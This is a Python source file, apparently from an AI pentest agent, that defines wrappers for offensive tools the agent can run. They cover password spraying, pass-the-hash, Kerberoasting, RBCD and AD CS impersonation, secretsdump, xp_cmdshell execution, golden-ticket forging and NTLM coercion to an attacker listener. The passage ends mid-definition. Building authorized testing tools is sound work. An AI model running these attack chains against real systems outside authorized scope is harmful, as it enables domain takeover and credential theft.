# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""The tool catalog: declarative specs for the full pentest toolbox.

Each entry is a CommandSpec. The registry loads whichever tools are actually
installed on the host, so the agent only ever sees tools it can run. Tools are
grouped by domain (network, web, smb/ad, credentials). Every spec resolves a
host to authorize before running — the scope gate applies to all of them.

Wordlist defaults point at paths present on a default Kali install.
"""
from __future__ import annotations

import re as _re
from typing import Any

from ..facts import HarvestRule
from .command import (CommandSpec, host_from_domain, host_from_target,
                      host_from_url)

# Common wordlists shipped with Kali.
WL_DIR = "/usr/share/wordlists/dirb/common.txt"
WL_USERS = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
WL_ROCKYOU = "/usr/share/wordlists/rockyou.txt"
# Matches a bare subdomain/host on its own line (subfinder/amass -silent output).
_SUBDOMAIN_RE = r"^([a-z0-9][a-z0-9._\-]*\.[a-z]{2,})$"


def _s(v: Any) -> str:
    return str(v)


def _flag(args: list[str], kwargs: dict, key: str, flag: str) -> None:
    """Append `flag value` when the model supplied `key`."""
    if kwargs.get(key) not in (None, ""):
        args.extend([flag, _s(kwargs[key])])


def _creds(kwargs: dict) -> list[str]:
    out: list[str] = []
    _flag(out, kwargs, "username", "-u")
    _flag(out, kwargs, "password", "-p")
    return out


def _nxc_auth(k: dict, guest_default: bool = False) -> list[str]:
    """NetExec auth fragment supporting password OR pass-the-hash, an empty
    password (guest/null session), and an optional domain.

    - username + hash  -> -u user -H <ntlm>   (pass-the-hash)
    - username + pass  -> -u user -p <pass>
    - username only    -> -u user -p ''       (guest/null session)
    - guest_default    -> defaults username to 'guest' when none supplied
    """
    out: list[str] = []
    user = k.get("username") or ("guest" if guest_default else "")
    if user:
        out += ["-u", _s(user)]
    if k.get("hash"):
        out += ["-H", _s(k["hash"])]
    elif user:
        out += ["-p", _s(k.get("password", "") or "")]
    if k.get("domain"):
        out += ["-d", _s(k["domain"])]
    return out


# Reusable parameter fragments -------------------------------------------------
_TARGET = {"target": {"type": "string", "description": "Host or IP."}}
_URL = {"url": {"type": "string", "description": "Full URL incl. scheme/port."}}
_AUTH = {
    "username": {"type": "string", "description": "Username (optional)."},
    "password": {"type": "string", "description": "Password (optional)."},
}
# Auth fragment that also allows pass-the-hash and a domain (for AD tooling).
_AUTH_H = {
    **_AUTH,
    "hash": {"type": "string", "description": "NTLM hash for pass-the-hash "
             "(use instead of password, e.g. from a dumped/backup credential)."},
}
_DOMAIN = {"domain": {"type": "string", "description": "Domain, e.g. corp.local or example.com."}}
_WORDLIST = {"wordlist": {"type": "string", "description": "Wordlist path (optional)."}}
_HASHFILE = {"hashfile": {"type": "string", "description": "Path to a file of hashes to crack."}}


def _params(props: dict, required: list[str]) -> dict:
    return {"type": "object", "properties": props, "required": required}


CATALOG: list[CommandSpec] = [

    # ---- Network / service discovery ------------------------------------
    CommandSpec(
        name="masscan",
        description="Very fast Internet-scale TCP port sweep of a host/range. "
                    "Use to find open ports quickly before nmap version scans.",
        binary="masscan",
        parameters=_params({**_TARGET,
            "ports": {"type": "string", "description": "e.g. '1-65535' or '80,443'. Default 1-1000."},
            "rate": {"type": "string", "description": "Packets/sec. Default 1000."}},
            ["target"]),
        build_args=lambda k: [_s(k["target"]), "-p", _s(k.get("ports", "1-1000")),
                              "--rate", _s(k.get("rate", "1000")), "-oL", "-"],
        install_hint="apt install masscan (needs root/CAP_NET_RAW).",
    ),
    CommandSpec(
        name="dns_recon",
        description="Enumerate DNS records and attempt zone transfer against a "
                    "domain's nameserver. Good for AD domains.",
        binary="dnsrecon",
        parameters=_params({**_TARGET, **_DOMAIN},
            ["target", "domain"]),
        build_args=lambda k: ["-n", _s(k["target"]), "-d", _s(k["domain"]), "-a"],
        install_hint="apt install dnsrecon.",
    ),

    # ---- Web ------------------------------------------------------------
    CommandSpec(
        name="whatweb",
        description="Fingerprint a web app: server, CMS, frameworks, versions.",
        binary="whatweb",
        parameters=_params({**_URL, "aggression": {"type": "string",
            "description": "1 (stealthy) to 3 (aggressive). Default 1."}}, ["url"]),
        build_args=lambda k: [f"-a{_s(k.get('aggression','1'))}", _s(k["url"])],
        host_resolver=host_from_url,
        install_hint="apt install whatweb.",
    ),
    CommandSpec(
        name="nikto",
        description="Scan a web server for known vulnerabilities, dangerous "
                    "files, and misconfigurations.",
        binary="nikto",
        parameters=_params(_URL, ["url"]),
        build_args=lambda k: ["-h", _s(k["url"]), "-ask", "no"],
        host_resolver=host_from_url, timeout=1200,
        install_hint="apt install nikto.",
    ),
    CommandSpec(
        name="nuclei",
        description="Run Nuclei templated vulnerability checks against a URL. "
                    "Optionally filter by severity (critical,high,medium).",
        binary="nuclei",
        parameters=_params({**_URL, "severity": {"type": "string",
            "description": "Comma list e.g. 'critical,high'. Optional."}}, ["url"]),
        build_args=lambda k: ["-u", _s(k["url"]), "-silent", "-nc"]
                             + (["-severity", _s(k["severity"])] if k.get("severity") else []),
        host_resolver=host_from_url, timeout=1800,
        install_hint="Install from projectdiscovery (nuclei).",
    ),
    CommandSpec(
        name="ffuf",
        description="Fuzz for hidden web content/directories. Put FUZZ in the "
                    "URL where the wordlist should be inserted.",
        binary="ffuf",
        parameters=_params({
            "url": {"type": "string", "description": "URL with FUZZ keyword, e.g. http://h/FUZZ"},
            "wordlist": {"type": "string", "description": f"Wordlist path. Default {WL_DIR}."},
            "extensions": {"type": "string", "description": "e.g. '.php,.txt'. Optional."}},
            ["url"]),
        build_args=lambda k: ["-u", _s(k["url"]), "-w", _s(k.get("wordlist", WL_DIR)),
                              "-mc", "200,204,301,302,307,401,403", "-s"]
                             + (["-e", _s(k["extensions"])] if k.get("extensions") else []),
        host_resolver=host_from_url, timeout=1200,
        install_hint="apt install ffuf.",
    ),
    CommandSpec(
        name="gobuster_dir",
        description="Brute-force web directories/files with gobuster.",
        binary="gobuster",
        parameters=_params({**_URL,
            "wordlist": {"type": "string", "description": f"Default {WL_DIR}."}}, ["url"]),
        build_args=lambda k: ["dir", "-u", _s(k["url"]), "-w",
                              _s(k.get("wordlist", WL_DIR)), "-q"],
        host_resolver=host_from_url, timeout=1200,
        install_hint="apt install gobuster.",
    ),
    CommandSpec(
        name="wpscan",
        description="Scan a WordPress site for vulnerable plugins/themes/users.",
        binary="wpscan",
        parameters=_params({**_URL,
            "enumerate": {"type": "string", "description": "e.g. 'vp,u' (vuln plugins, users). Optional."}}, ["url"]),
        build_args=lambda k: ["--url", _s(k["url"]), "--no-banner",
                              "--random-user-agent"]
                             + (["-e", _s(k["enumerate"])] if k.get("enumerate") else []),
        host_resolver=host_from_url, timeout=1200,
        install_hint="apt install wpscan.",
    ),
    CommandSpec(
        name="sqlmap",
        description="Test a URL for SQL injection (automated). Intrusive.",
        binary="sqlmap",
        parameters=_params({**_URL,
            "data": {"type": "string", "description": "POST body to test. Optional."},
            "level": {"type": "string", "description": "1-5 test depth. Default 1."}}, ["url"]),
        build_args=lambda k: ["-u", _s(k["url"]), "--batch",
                              "--level", _s(k.get("level", "1"))]
                             + (["--data", _s(k["data"])] if k.get("data") else []),
        host_resolver=host_from_url, timeout=1800,
        install_hint="apt install sqlmap.",
    ),

    # ---- SMB / Active Directory -----------------------------------------
    # Reference example of the DECLARATIVE style: no build_args lambda — argv is
    # assembled from subcommand + positional + flags. The flag map is the
    # canonical-variable → CLI-switch translation (username → -u, etc.).
    CommandSpec(
        name="netexec_smb",
        description="Enumerate/authenticate SMB on a host with NetExec: OS/domain "
                    "info; with creds or a hash (pass-the-hash) it lists "
                    "shares/users/pass-pol, and can run a command (-x) when the "
                    "account is admin (look for 'Pwn3d!'). protocol fixed to smb.",
        binary="nxc",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "enumerate": {"type": "string", "description": "One of: shares, users, "
                          "groups, pass-pol, loggedon-users, sessions, disks. Optional."},
            "command": {"type": "string", "description": "Command to run via -x when "
                        "the account is a local admin (optional)."}},
            ["target"]),
        build_args=lambda k: ["smb", _s(k["target"])] + _nxc_auth(k)
                             + (["--" + _s(k["enumerate"])] if k.get("enumerate") else [])
                             + (["-x", _s(k["command"])] if k.get("command") else []),
        install_hint="pipx install netexec (provides nxc).",
    ),
    CommandSpec(
        name="netexec_rid_brute",
        description="Enumerate ALL domain users by RID-cycling over SMB. Works with a "
                    "guest/null session (no creds) or any valid account — the primary "
                    "way to build a user list on an AD DC when you have none.",
        binary="nxc",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "max_rid": {"type": "string", "description": "Highest RID to try. Default 4000."}},
            ["target"]),
        build_args=lambda k: ["smb", _s(k["target"])] + _nxc_auth(k, guest_default=True)
                             + ["--rid-brute", _s(k.get("max_rid", "4000"))],
        install_hint="pipx install netexec.",
    ),
    CommandSpec(
        name="netexec_spray",
        description="Password-spray a user list over SMB in ONE batch (server-side, "
                    "fast) — this is the correct way to test many accounts, never "
                    "one-by-one. Give userfile plus either a single password, a "
                    "passfile, or userpass='true' to try username==password. Uses "
                    "--no-bruteforce (one attempt per user) to avoid lockout.",
        binary="nxc",
        parameters=_params({**_TARGET, **_DOMAIN,
            "userfile": {"type": "string", "description": "Path to a usernames file (one per line)."},
            "password": {"type": "string", "description": "Single password to spray (optional)."},
            "passfile": {"type": "string", "description": "Path to a passwords file (optional)."},
            "userpass": {"type": "string", "description": "'true' to try username==password."}},
            ["target", "userfile"]),
        build_args=lambda k: ["smb", _s(k["target"]), "-u", _s(k["userfile"]), "-p",
                              (_s(k["userfile"]) if _s(k.get("userpass", "")).lower()
                               in ("true", "1", "yes")
                               else _s(k["passfile"]) if k.get("passfile")
                               else _s(k.get("password", "")))]
                             + (["-d", _s(k["domain"])] if k.get("domain") else [])
                             + ["--no-bruteforce", "--continue-on-success"],
        install_hint="pipx install netexec.",
    ),
    CommandSpec(
        name="smb_get",
        description="Download a file from an SMB share (creds or pass-the-hash) to "
                    "loot it — e.g. a backup/config that leaks credentials. Saves to "
                    "the logs dir. Give the share name and the remote file path.",
        binary="nxc",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "share": {"type": "string", "description": "Share name, e.g. backup."},
            "path": {"type": "string", "description": "Remote file path in the share, e.g. backup_extract.txt."}},
            ["target", "share", "path"]),
        build_args=lambda k: ["smb", _s(k["target"])] + _nxc_auth(k)
                             + ["--share", _s(k["share"]), "--get-file", _s(k["path"]),
                                "loot_" + _s(k["path"]).replace("\\", "_").replace("/", "_")],
        install_hint="pipx install netexec.",
    ),
    # Added purely declaratively — shows how little a new tool needs.
    CommandSpec(
        name="netexec_winrm",
        description="Check WinRM (5985/5986) access with NetExec (creds or "
                    "pass-the-hash) and run a command (default whoami). Validates that "
                    "an account gives remote code execution ('Pwn3d!').",
        binary="nxc",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "command": {"type": "string", "description": "Command to run (default whoami)."}},
            ["target"]),
        build_args=lambda k: ["winrm", _s(k["target"])] + _nxc_auth(k)
                             + ["-x", _s(k.get("command") or "whoami")],
        install_hint="pipx install netexec.",
    ),
    CommandSpec(
        name="netexec_ldap",
        description="Query LDAP/AD via NetExec (with creds): users, groups, and "
                    "Kerberoast/asreproast discovery.",
        binary="nxc",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "action": {"type": "string", "description": "e.g. '--users', "
                       "'--kerberoasting out.txt', '--asreproast out.txt'. Optional."}},
            ["target"]),
        build_args=lambda k: ["ldap", _s(k["target"])] + _nxc_auth(k)
                             + (_s(k["action"]).split() if k.get("action") else []),
        install_hint="pipx install netexec.",
    ),
    CommandSpec(
        name="enum4linux",
        description="Comprehensive SMB/RPC enumeration (users, shares, groups, "
                    "policy) against a Windows/Samba host.",
        binary="enum4linux-ng",
        parameters=_params({**_TARGET, **_AUTH}, ["target"]),
        build_args=lambda k: ["-A", _s(k["target"])]
                             + (["-u", _s(k["username"]), "-p", _s(k.get("password", ""))]
                                if k.get("username") else []),
        aliases=["enum4linux"], install_hint="apt install enum4linux-ng.",
    ),
    CommandSpec(
        name="smbmap",
        description="List SMB shares and access levels on a host, with optional creds.",
        binary="smbmap",
        parameters=_params({**_TARGET, **_AUTH,
            **_DOMAIN}, ["target"]),
        build_args=lambda k: ["-H", _s(k["target"])] + _creds(k)
                             + (["-d", _s(k["domain"])] if k.get("domain") else []),
        install_hint="apt install smbmap.",
    ),
    CommandSpec(
        name="smbclient_shares",
        description="List available SMB shares anonymously (null session).",
        binary="smbclient",
        parameters=_params(_TARGET, ["target"]),
        build_args=lambda k: ["-L", f"//{_s(k['target'])}/", "-N"],
        install_hint="apt install smbclient.",
    ),
    CommandSpec(
        name="ldapsearch_anon",
        description="Anonymous LDAP query of an AD domain controller. Returns "
                    "directory entries if anonymous bind is allowed.",
        binary="ldapsearch",
        parameters=_params({**_TARGET,
            "base_dn": {"type": "string", "description": "e.g. DC=corp,DC=local"},
            "filter": {"type": "string", "description": "LDAP filter. Default (objectclass=*)."}},
            ["target", "base_dn"]),
        build_args=lambda k: ["-x", "-H", f"ldap://{_s(k['target'])}", "-b",
                              _s(k["base_dn"]), _s(k.get("filter", "(objectclass=*)"))],
        install_hint="apt install ldap-utils.",
    ),
    CommandSpec(
        name="kerbrute_userenum",
        description="Enumerate valid AD usernames via Kerberos pre-auth (no "
                    "lockout). Needs a username wordlist and the domain.",
        binary="kerbrute",
        parameters=_params({**_TARGET, **_DOMAIN,
            "userlist": {"type": "string", "description": f"Path to usernames. Default {WL_USERS}."}},
            ["target", "domain"]),
        build_args=lambda k: ["userenum", "--dc", _s(k["target"]), "-d",
                              _s(k["domain"]), _s(k.get("userlist", WL_USERS))],
        install_hint="Install kerbrute (ropnop).",
    ),
    CommandSpec(
        name="asrep_roast",
        description="AS-REP roasting: request Kerberos tickets for users without "
                    "pre-auth. Needs a usernames file; no password required.",
        binary="impacket-GetNPUsers",
        parameters=_params({**_TARGET, **_DOMAIN,
            "userlist": {"type": "string", "description": "Path to usernames file."}},
            ["target", "domain", "userlist"]),
        build_args=lambda k: [f"{_s(k['domain'])}/", "-usersfile", _s(k["userlist"]),
                              "-dc-ip", _s(k["target"]), "-no-pass", "-request",
                              "-format", "hashcat"],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="kerberoast",
        description="Kerberoasting: request service tickets (SPNs) for offline "
                    "cracking. Requires valid domain credentials.",
        binary="impacket-GetUserSPNs",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "domain", "username", "password"]),
        build_args=lambda k: [f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}",
                              "-dc-ip", _s(k["target"]), "-request", "-outputfile", "spns.txt"],
        install_hint="pipx install impacket.",
    ),
    # ---- Resource-Based Constrained Delegation (RBCD) -> Domain Admin -------
    CommandSpec(
        name="add_computer",
        description="Create a new AD computer account (needs MachineAccountQuota>0). "
                    "Used as the controlled principal for an RBCD attack. Needs valid "
                    "domain credentials. Default computer ATTACK$ / Attack123!.",
        binary="impacket-addcomputer", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "computer_name": {"type": "string", "description": "New computer name without $ (default ATTACK)."},
            "computer_pass": {"type": "string", "description": "Password for the new computer (default Attack123!)."}},
            ["target", "domain", "username", "password"]),
        build_args=lambda k: ["-computer-name", _s(k.get("computer_name", "ATTACK")) + "$",
                              "-computer-pass", _s(k.get("computer_pass", "Attack123!")),
                              "-dc-ip", _s(k["target"]),
                              f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="rbcd",
        description="Configure Resource-Based Constrained Delegation: grant a "
                    "computer/account you control the right to act on behalf of "
                    "others on a target (write msDS-AllowedToActOnBehalfOfOtherIdentity). "
                    "Needs creds for a principal with write over the target computer.",
        binary="impacket-rbcd", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "delegate_from": {"type": "string", "description": "Account you control, e.g. ATTACK$."},
            "delegate_to": {"type": "string", "description": "Target computer, e.g. DC01$."}},
            ["target", "domain", "username", "password", "delegate_from", "delegate_to"]),
        build_args=lambda k: ["-delegate-from", _s(k["delegate_from"]),
                              "-delegate-to", _s(k["delegate_to"]), "-action", "write",
                              "-dc-ip", _s(k["target"]),
                              f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="get_st",
        description="Request a service ticket impersonating a user via S4U2Proxy "
                    "(after RBCD/constrained delegation). Saves a .ccache; set "
                    "KRB5CCNAME to it and use -k with impacket/nxc. E.g. impersonate "
                    "Administrator for cifs/DC01 to get admin on the DC.",
        binary="impacket-getST", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "spn": {"type": "string", "description": "Target SPN, e.g. cifs/DC01.ctf.local."},
            "impersonate": {"type": "string", "description": "User to impersonate, e.g. Administrator."}},
            ["target", "domain", "username", "password", "spn", "impersonate"]),
        build_args=lambda k: ["-spn", _s(k["spn"]), "-impersonate", _s(k["impersonate"]),
                              "-dc-ip", _s(k["target"]),
                              f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="certipy_find",
        description="Enumerate Active Directory Certificate Services (AD CS): "
                    "CAs and certificate templates, flagging vulnerable ones "
                    "(ESC1-ESC8). Needs valid domain credentials.",
        binary="certipy-ad", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "domain", "username", "password"]),
        build_args=lambda k: ["find", "-u", f"{_s(k['username'])}@{_s(k['domain'])}",
                              "-p", _s(k["password"]), "-dc-ip", _s(k["target"]),
                              "-ns", _s(k["target"]), "-dns-tcp",
                              "-stdout", "-vulnerable"],
        aliases=["certipy"], timeout=600,
        install_hint="pipx install certipy-ad (point DNS at a DC — the DC is the name server).",
    ),
    CommandSpec(
        name="bloodhound_python",
        description="Collect Active Directory data (users, groups, ACLs, "
                    "sessions, trusts) for BloodHound analysis. Needs valid "
                    "domain credentials; the DC IP is the name server.",
        binary="bloodhound-python", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "domain", "username", "password"]),
        flags={"domain": "-d", "username": "-u", "password": "-p", "target": "-ns"},
        fixed=["-c", "all", "--zip"], timeout=1200,
        aliases=["bloodhound.py"], install_hint="pipx install bloodhound.",
    ),
    CommandSpec(
        name="secretsdump",
        description="Dump password hashes (SAM/NTDS/LSA) from a host using valid "
                    "credentials. Highly intrusive — post-exploitation.",
        binary="impacket-secretsdump",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "username", "password"]),
        build_args=lambda k: [f"{_s(k.get('domain','') )}/{_s(k['username'])}:"
                              f"{_s(k['password'])}@{_s(k['target'])}"],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="netexec_mssql",
        description="Authenticate to MSSQL (1433) with NetExec using Windows or SQL "
                    "auth, run a T-SQL query (-q) or an OS command via xp_cmdshell (-x, "
                    "auto-enabled when the login is privileged). Turns a SQL foothold "
                    "into command execution as the service account (then SYSTEM).",
        binary="nxc", category="ad-smb",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "query": {"type": "string", "description": "T-SQL query to run (optional)."},
            "command": {"type": "string", "description": "OS command via xp_cmdshell (optional)."},
            "local_auth": {"type": "string", "description": "'true' for a local SQL login instead of Windows auth."}},
            ["target"]),
        build_args=lambda k: ["mssql", _s(k["target"])] + _nxc_auth(k)
                             + (["--local-auth"] if _s(k.get("local_auth", "")).lower()
                                in ("true", "1", "yes") else [])
                             + (["-q", _s(k["query"])] if k.get("query") else [])
                             + (["-x", _s(k["command"])] if k.get("command") else []),
        install_hint="pipx install netexec.",
    ),
    CommandSpec(
        name="ticketer",
        description="Forge a Kerberos ticket OFFLINE. Golden ticket: give the krbtgt NT "
                    "hash for full-domain persistence. Silver ticket: give a service "
                    "account's NT hash plus its SPN for access to one service. Writes "
                    "<user>.ccache; export KRB5CCNAME to it and use -k with impacket/nxc.",
        binary="impacket-ticketer", category="ad-smb", requires_host=False,
        host_resolver=host_from_domain,
        parameters=_params({**_DOMAIN,
            "nthash": {"type": "string", "description": "NT hash: krbtgt (golden) or the service account (silver)."},
            "domain_sid": {"type": "string", "description": "Domain SID, e.g. S-1-5-21-…."},
            "username": {"type": "string", "description": "User to forge the ticket for (e.g. Administrator)."},
            "spn": {"type": "string", "description": "Service SPN for a SILVER ticket (omit for golden)."}},
            ["domain", "nthash", "domain_sid", "username"]),
        build_args=lambda k: ["-nthash", _s(k["nthash"]), "-domain-sid", _s(k["domain_sid"]),
                              "-domain", _s(k["domain"])]
                             + (["-spn", _s(k["spn"])] if k.get("spn") else [])
                             + [_s(k["username"])],
        harvest=[HarvestRule("ccache", r"Saving ticket in\s+(\S+\.ccache)")],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="certipy_req",
        description="Request a certificate from a vulnerable AD CS template (ESC1/ESC2/…): "
                    "with -upn you enroll a cert AS another user (e.g. administrator) and "
                    "get their .pfx. Needs a domain credential and the CA + template names "
                    "from certipy_find.",
        binary="certipy-ad", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "ca": {"type": "string", "description": "CA name (from certipy_find), e.g. SEVENKINGDOMS-CA."},
            "template": {"type": "string", "description": "Vulnerable template name, e.g. ESC1."},
            "upn": {"type": "string", "description": "User to impersonate, e.g. administrator@domain."}},
            ["target", "domain", "username", "password", "ca", "template"]),
        build_args=lambda k: ["req", "-u", f"{_s(k['username'])}@{_s(k['domain'])}",
                              "-p", _s(k["password"]), "-dc-ip", _s(k["target"]),
                              "-ns", _s(k["target"]), "-dns-tcp",
                              "-ca", _s(k["ca"]), "-template", _s(k["template"])]
                             + (["-upn", _s(k["upn"])] if k.get("upn") else []),
        harvest=[HarvestRule("pfx", r"Saved certificate and private key to '([^']+\.pfx)'")],
        aliases=["certipy"], timeout=600, install_hint="pipx install certipy-ad.",
    ),
    CommandSpec(
        name="certipy_auth",
        description="Authenticate with a certificate (.pfx from certipy_req) to recover "
                    "the target user's NT hash and a Kerberos TGT — completing an AD CS "
                    "ESC escalation to that user (often Domain Admin).",
        binary="certipy-ad", category="ad-smb",
        parameters=_params({**_TARGET,
            "pfx": {"type": "string", "description": "Path to the .pfx from certipy_req."}},
            ["target", "pfx"]),
        build_args=lambda k: ["auth", "-pfx", _s(k["pfx"]), "-dc-ip", _s(k["target"]),
                              "-ns", _s(k["target"]), "-dns-tcp"],
        harvest=[HarvestRule("nthash", r"Got hash for '[^']+':\s*[a-f0-9]{32}:([a-f0-9]{32})")],
        aliases=["certipy"], install_hint="pipx install certipy-ad.",
    ),
    CommandSpec(
        name="coercer",
        description="Coerce a Windows host (DC/server) into authenticating to an "
                    "attacker-controlled listener over MS-RPRN (PrinterBug), MS-EFSR "
                    "(PetitPotam), MS-DFSNM, etc. This is the trigger for an NTLM relay "
                    "or a NetNTLM capture. Needs a domain credential and a listener IP "
                    "(your host). Pair with a running ntlmrelayx / responder.",
        binary="coercer", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "listener": {"type": "string", "description": "Attacker IP the target should authenticate to."}},
            ["target", "listener"]),
        build_args=lambda k: ["coerce", "-t", _s(k["target"]), "-l", _s(k["listener"])]
                             + (["-u", _s(k["username"]), "-p", _s(k.get("password", "")),
                                 "-d", _s(k.get("domain", ""))] if k.get("username") else [])
                             + ["-v"],
        harvest=[HarvestRule("coerced", r"\[\+\].*(?:got|authentication|responded|success)", scope="host")],
        timeout=300, install_hint="pipx install coercer.",
    ),

    # ---- Credentials -----------------------------------------------------
    CommandSpec(
        name="hydra",
        description="Online password brute-force against a network service "
                    "(ssh, ftp, rdp, smb, http-*). Intrusive and noisy.",
        binary="hydra",
        parameters=_params({**_TARGET,
            "service": {"type": "string", "description": "e.g. ssh, ftp, rdp, smb."},
            "userlist": {"type": "string", "description": "Path to usernames file."},
            "passlist": {"type": "string", "description": "Path to passwords file."}},
            ["target", "service", "userlist", "passlist"]),
        build_args=lambda k: ["-L", _s(k["userlist"]), "-P", _s(k["passlist"]),
                              "-t", "4", "-f", _s(k["target"]), _s(k["service"])],
        timeout=1800, install_hint="apt install hydra.",
    ),
    CommandSpec(
        name="searchsploit",
        description="Search the local Exploit-DB for known exploits matching a "
                    "product/version string. Local lookup — no target contacted.",
        binary="searchsploit",
        parameters=_params({"query": {"type": "string",
            "description": "Product and version, e.g. 'vsftpd 2.3.4'."}}, ["query"]),
        build_args=lambda k: _s(k["query"]).split(),
        requires_host=False, active=False,
        install_hint="apt install exploitdb.",
    ),

    # ==== Extended coverage (from the pentest cheat sheet) ================
    # ---- Recon: subdomain / OSINT / crawl (feed the host + web pipeline) --
    CommandSpec(
        name="subfinder",
        description="Passively enumerate subdomains of a domain. Discovered "
                    "subdomains are recorded as hosts for follow-up scanning.",
        binary="subfinder", category="recon", host_resolver=host_from_domain,
        parameters=_params(_DOMAIN, ["domain"]),
        flags={"domain": "-d"}, fixed=["-silent"],
        harvest=[HarvestRule("host", _SUBDOMAIN_RE, multi=True,
                             flags=_re.MULTILINE)],
        install_hint="apt install subfinder.",
    ),
    CommandSpec(
        name="amass",
        description="Enumerate subdomains (passive) with OWASP Amass. Results "
                    "are recorded as hosts.",
        binary="amass", category="recon", host_resolver=host_from_domain,
        parameters=_params(_DOMAIN, ["domain"]),
        subcommand=["enum", "-passive"], flags={"domain": "-d"},
        harvest=[HarvestRule("host", _SUBDOMAIN_RE, multi=True,
                             flags=_re.MULTILINE)],
        timeout=1200, install_hint="apt install amass.",
    ),
    CommandSpec(
        name="theharvester",
        description="OSINT gathering of subdomains and emails for a domain "
                    "from public sources.",
        binary="theHarvester", category="recon", host_resolver=host_from_domain,
        parameters=_params(_DOMAIN, ["domain"]),
        flags={"domain": "-d"}, fixed=["-b", "bing,duckduckgo,crtsh"],
        aliases=["theharvester"], install_hint="apt install theharvester.",
    ),
    CommandSpec(
        name="httpx",
        description="Probe a URL/host for a live HTTP service: status, title, "
                    "and detected technologies. Fast triage of web hosts.",
        binary="httpx-toolkit", category="recon", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        flags={"url": "-u"}, fixed=["-silent", "-title", "-tech-detect", "-status-code"],
        aliases=["httpx"], install_hint="apt install httpx-toolkit.",
    ),
    CommandSpec(
        name="katana",
        description="Crawl a website and list discovered URLs/endpoints "
                    "(feeds parameter and fuzzing tools).",
        binary="katana", category="web", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        flags={"url": "-u"}, fixed=["-silent", "-jc"],
        timeout=900, install_hint="apt install katana.",
    ),
    CommandSpec(
        name="gau",
        description="Fetch known historical URLs for a domain from the Wayback "
                    "Machine and other archives.",
        binary="gau", category="recon", host_resolver=host_from_domain,
        parameters=_params(_DOMAIN, ["domain"]),
        positional=["domain"], fixed=["--threads", "5"],
        install_hint="go install github.com/lc/gau/v2/cmd/gau@latest.",
    ),

    # ---- Web / vulnerability --------------------------------------------
    CommandSpec(
        name="feroxbuster",
        description="Fast recursive content/directory discovery on a web app.",
        binary="feroxbuster", category="web", host_resolver=host_from_url,
        parameters=_params({**_URL, **_WORDLIST}, ["url"]),
        flags={"url": "-u", "wordlist": "-w"}, fixed=["-q", "--no-state"],
        timeout=1200, install_hint="apt install feroxbuster.",
    ),
    CommandSpec(
        name="arjun",
        description="Discover hidden HTTP request parameters on a URL "
                    "(feeds SQLi/XSS testing).",
        binary="arjun", category="web", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        flags={"url": "-u"}, install_hint="pipx install arjun.",
    ),
    CommandSpec(
        name="testssl",
        description="Assess a host's SSL/TLS configuration and known TLS "
                    "vulnerabilities (Heartbleed, weak ciphers, etc.).",
        binary="testssl", category="web", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        fixed=["--quiet", "--color", "0"], positional=["url"],
        aliases=["testssl.sh"], timeout=1200, install_hint="apt install testssl.sh.",
    ),
    CommandSpec(
        name="subzy",
        description="Check a URL/subdomain for subdomain-takeover conditions.",
        binary="subzy", category="web", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        subcommand=["run"], flags={"url": "--target"},
        install_hint="go install github.com/PentestPad/subzy@latest.",
    ),

    # ---- Credentials: hash cracking (closes the AD roasting loop) --------
    CommandSpec(
        name="john",
        description="Crack a file of hashes with John the Ripper using a "
                    "wordlist (auto-detects many formats, incl. Kerberos).",
        binary="john", category="credentials", requires_host=False,
        parameters=_params({**_HASHFILE, **_WORDLIST}, ["hashfile"]),
        positional=["hashfile"],
        flags={"wordlist": "--wordlist"},
        install_hint="apt install john.",
    ),
    CommandSpec(
        name="hashcat",
        description="GPU/CPU hash cracking. Provide the hashcat mode (-m), the "
                    "hash file, and a wordlist.",
        binary="hashcat", category="credentials", requires_host=False,
        parameters=_params({**_HASHFILE, **_WORDLIST,
            "mode": {"type": "string", "description": "hashcat -m mode, e.g. 13100 (TGS), 18200 (AS-REP), 1000 (NTLM)."}},
            ["hashfile", "mode"]),
        flags={"mode": "-m"}, positional=["hashfile", "wordlist"],
        fixed=["--quiet"], install_hint="apt install hashcat.",
    ),
    CommandSpec(
        name="hashid",
        description="Identify the likely type/algorithm of hashes in a file.",
        binary="hashid", category="credentials", requires_host=False,
        parameters=_params(_HASHFILE, ["hashfile"]),
        positional=["hashfile"], active=False, install_hint="apt install hashid.",
    ),
]

# Classify each catalogued tool into a category (used for grouped listings).
_CATEGORIES = {
    "recon": ["masscan", "dns_recon"],
    "web": ["whatweb", "nikto", "nuclei", "ffuf", "gobuster_dir", "wpscan",
            "sqlmap"],
